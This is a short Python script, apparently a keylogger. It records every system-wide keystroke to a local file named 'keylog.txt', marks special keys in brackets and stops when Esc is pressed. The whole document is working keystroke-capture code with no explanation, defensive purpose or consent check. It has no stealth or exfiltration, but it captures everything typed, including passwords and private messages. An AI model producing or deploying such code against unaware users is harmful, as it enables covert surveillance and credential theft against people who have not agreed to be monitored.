import keyboard
import sys
import traceback

def main():
    try:
        log_file = "keylog.txt"
        with open(log_file, 'a') as f:
            while True:
                event = keyboard.read_event()
                if event.name == 'esc':
                    break
                elif len(event.name) > 1:
                    f.write('[' + event.name.upper() + ']')
                else:
                    f.write(event.name)
    except Exception as e:
        print("Error occurred:", str(e))
        traceback.print_exc()
    finally:
        sys.exit(0)

if __name__ == "__main__":
    main()